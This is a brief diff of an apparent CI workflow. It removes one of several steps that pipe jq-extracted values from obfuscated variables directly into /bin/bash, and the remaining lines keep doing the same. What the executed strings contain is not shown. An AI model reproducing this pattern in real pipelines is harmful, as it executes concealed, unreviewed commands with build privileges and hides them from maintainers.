@@ -23,7 +23,6 @@ jobs:
           echo $tuzer46 | jq -r .e22 | /bin/bash
           printf '%s' "$dzrf71" | jq -r .hue414 | /bin/bash
           printf '%s' "$r94" | jq -r .ai0 | /bin/bash
-          printf '%s' "$zk25674" | jq -r .hqw7901 | /bin/bash
           echo $tggyb9 | jq -r .lumuq0 | /bin/bash
 
       - name: Save archive
